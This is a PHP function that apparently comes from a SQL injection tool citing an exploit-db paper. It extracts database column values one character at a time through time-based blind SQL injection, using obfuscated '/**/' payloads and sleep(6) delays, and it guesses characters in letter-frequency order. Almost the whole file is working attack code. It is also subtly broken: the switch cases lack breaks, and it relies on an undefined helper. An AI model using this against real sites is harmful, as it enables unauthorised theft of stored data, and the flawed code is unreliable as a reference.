<?php
//reference:https://www.exploit-db.com/papers/13696
//结合大数据和统计学,作者给出了不同字母开头,依字母频率的字符链
function brute($column,$table,$lim)
{
	$ret_str = "";
	$b_str = "tashwiobmcfdplnergyuvkjqzx_1234567890";
	$b_arr = str_split($b_str);
	for ($i=1;$i<100;$i++)
	{
		if($last_ltr){
			switch ($last_ltr){
				case "q": { $b_arr = str_split("uaqoisvretwybnhlxmfpzcdjgk_1234567890");}
				case "w": { $b_arr = str_split("ahieonsrldwyfktubmpcgzvjqx_1234567890");}
				case "e": { $b_arr = str_split("rndsaletcmvyipfxwgoubqhkzj_1234567890");}
				case "r": { $b_arr = str_split("eoiastydnmrugkclvpfbhwqzjx_1234567890");}
				case "t": { $b_arr = str_split("hoeiartsuylwmcnfpzbgdjkxvq_1234567890");}
				case "y": { $b_arr = str_split("oesitamrlnpbwdchfgukzvxjyq_1234567890");}
				case "u": { $b_arr = str_split("trsnlgpceimadbfoxkvyzwhjuq_1234567890");}
				case "i": { $b_arr = str_split("ntscolmedrgvfabpkzxuijqhwy_1234567890");}
				case "o": { $b_arr = str_split("nurfmtwolspvdkcibaeygjhxzq_1234567890");}
				case "p": { $b_arr = str_split("eroaliputhsygmwbfdknczjvqx_1234567890");}
				case "l": { $b_arr = str_split("eliayodusftkvmpwrcbgnhzqxj_1234567890");}
				case "k": { $b_arr = str_split("einslayowfumrhtkbgdcvpjzqx_1234567890");}
				case "j": { $b_arr = str_split("euoainkdlfsvztgprhycmjxwbq_1234567890");}
				case "h": { $b_arr = str_split("eaioturysnmlbfwdchkvqpgzjx_1234567890");}
				case "g": { $b_arr = str_split("ehroaiulsngtymdwbfpzkxcvjq_1234567890");}
				case "f": { $b_arr = str_split("oeriafutlysdngmwcphjkbzvqx_1234567890");}
				case "d": { $b_arr = str_split("eioasruydlgnvmwfhjtcbkpqzx_1234567890");}
				case "s": { $b_arr = str_split("tehiosaupclmkwynfbqdgrvjzx_1234567890");}
				case "a": { $b_arr = str_split("ntrsldicymvgbpkuwfehzaxjoq_1234567890");}
				case "z": { $b_arr = str_split("eiaozulywhmtvbrsgkcnpdjfqx_1234567890");}
				case "x": { $b_arr = str_split("ptcieaxhvouqlyfwbmsdgnzrkj_1234567890");}
				case "c": { $b_arr = str_split("oheatikrlucysqdfnzpmgxbwvj_1234567890");}
				case "v": { $b_arr = str_split("eiaoyrunlsvdptjgkhcmbfwzxq_1234567890");}
				case "b": { $b_arr = str_split("euloyaristbjmdvnhwckgpfzxq_1234567890");}
				}
		}
		print "[+] Brute $i symbol...\n";
		for ($j=0;$j<count($b_arr);$j++)
		{
			$brute = ord($b_arr[$j]);
			$q = "/**/and/**/if((ord(lower(mid((select/**/$column/**/from/**/$table/**/limit/**/$lim,1),$i,1))))=$brute,sleep(6),0)--";
			if (http_connect($q))
			{
				$ret_str=$ret_str.$b_arr[$j];
				print $b_arr[$j]."\n";
				$last_ltr=$b_arr[$j];
				break;
			}
			print ".";
		}
		if ($j == count($b_arr)) break;
	}
	return $ret_str;
}

?>